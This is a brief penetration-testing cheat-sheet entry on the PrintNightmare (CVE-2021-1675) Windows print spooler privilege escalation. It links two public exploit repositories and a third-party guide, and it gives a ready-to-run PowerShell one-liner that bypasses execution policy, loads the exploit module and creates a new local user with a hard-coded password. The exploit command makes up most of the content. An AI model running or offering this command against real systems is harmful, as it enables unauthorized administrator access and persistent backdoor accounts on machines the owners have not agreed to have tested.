---
description: PrintNightmare Local / Remote Privilege Escalation
---

# print nightmare

````
# no DLLs needed
https://github.com/calebstewart/CVE-2021-1675
powershell.exe -exec bypass -Command "& {Import-Module .\CVE-2021-1675.ps1; Invoke-Nightmare -NewUser 'kashz' -NewPassword 'iamkashz@123'}"

# contains DLL to complile
https://github.com/outflanknl/PrintNightmare

# 0xdf's guide
https://0xdf.gitlab.io/2021/07/08/playing-with-printnightmare.html
```
